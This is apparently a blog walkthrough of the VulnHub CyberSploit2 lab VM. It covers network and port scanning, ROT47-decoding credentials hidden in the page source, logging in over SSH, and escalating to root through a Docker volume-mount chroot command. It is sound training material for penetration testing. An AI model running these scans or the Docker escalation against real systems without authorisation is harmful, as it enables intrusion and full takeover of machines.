---
title: "CyberSploit 2 VulnHub Walkthrough"
description: "Boot to Root Your target is gain the Root access There is no any flag in this VMs"
date: 2024-07-29
categories: [CTF, VulnHub]
tags: [privilege escalation]
image:
  path: https://i.ytimg.com/vi/lQKO0zqyDpI/maxresdefault.jpg
---


This walkthrough guides you through the process of gaining root access on the CyberSploit2 boot2root virtual machine (VM) from Vulnhub. CyberSploit2 is the second part of the CyberSploit Series.

## Download the VM

- **Download the CyberSploit2 VM (size: 1.2 GB)** 
  - [Download Now](https://download.vulnhub.com/cybersploit/CyberSploit2.ova)

## Walkthrough

### 1. Discover Target Machine IP Address

Once the VM is running, determine its IP address using the 'arp-scan' utility:

```bash
┌──(root㉿neo)-[~]
└─# arp-scan -l
Interface: wlan0, type: EN10MB, MAC: 50:c2:e8:43:93:3b, IPv4: 192.168.1.8
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.4	08:00:27:ee:18:51	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.003 seconds (127.81 hosts/sec). 1 responded
```

### 2. Scan for Open Ports

Use Nmap to scan for open ports on the target machine (replace `<target_IP>` with the VM's IP address obtained in the previous step):

```bash
┌──(root㉿neo)-[~]
└─# nmap -A 192.168.1.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 08:47 IST
Nmap scan report for 192.168.1.4
Host is up (0.00053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberSploit2
|_http-server-header: Apache/2.4.37 (centos)
MAC Address: 08:00:27:EE:18:51 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.1.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

### 3. Enumerate HTTP Service

Explore the identified HTTP service (e.g., browse to `http://<target_IP>` in a web browser).

![Webpage Screenshot](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/655ba6b0-cc80-4aa0-b954-af52a31cda0f)

Here on Line 4 of the webpage, hashes `D92:=6?5C2` & `4J36CDA=@:E` are found.

![Source Code Screenshot](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/69ec26be-98dd-4b62-9472-25bd5ddea149)

The webpage source code at line 126 contains `<!-- ROT47 -->` hint for line 4 hash in ROT47 format.

#### Let's Crack The Hash Using ROT47

```bash
┌──(root㉿neo)-[~]
└─# echo "D92:=6?5C2" | tr '!-~' 'P-~!-O'

shailendra
```

Cracking the Second Hash:

```bash
┌──(root㉿neo)-[~]
└─# cat hash.txt | tr '!-~' 'P-~!-O'       

cybersploit1
```

The hashes are cracked:
- Username: `shailendra`
- Password: `cybersploit1`

#### 4. Login to SSH

Attempt to login to SSH using the discovered credentials:

```bash
┌──(root㉿neo)-[~]
└─# ssh shailendra@192.168.1.4
shailendra@192.168.1.4's password: 
Last login: Mon Apr 15 08:34:27 2024 from 192.168.1.8
[shailendra@localhost ~]$ 
```

#### 5. Obtain User Flag

Explore the user account for further clues and locate the user flag.

```bash
[shailendra@localhost ~]$ ls
hint.txt
[shailendra@localhost ~]$ cat hint.txt
docker
[shailendra@localhost ~]$ 
```

#### 6. Escalate Privileges via Docker

Search for Docker-related vulnerabilities using [GTFOBins](https://gtfobins.github.io/gtfobins/docker/).

![GTFOBins Screenshots](https://github.com/f141ne0/f141ne0.github.io/assets/165682600/5cd3822f-3ae5-4ff1-bb5b-c614b26729e8)

Execute Docker commands to escalate privileges to root:

```bash
[shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
4abcf2066143

: Pull complete 
Digest: sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b
Status: Downloaded newer image for alpine:latest
sh-4.4# 
```

#### 7. Find the Root Flag

Navigate to the `/root` directory and locate the root flag:

```bash
sh-4.4# ls /root
anaconda-ks.cfg  flag.txt  get-docker.sh  logs
sh-4.4# cat /root/flag.txt
__    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/

 |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
sh-4.4# 
```

## Conclusion

Congratulations! You have successfully rooted the CyberSploit2 VM from VulnHub.
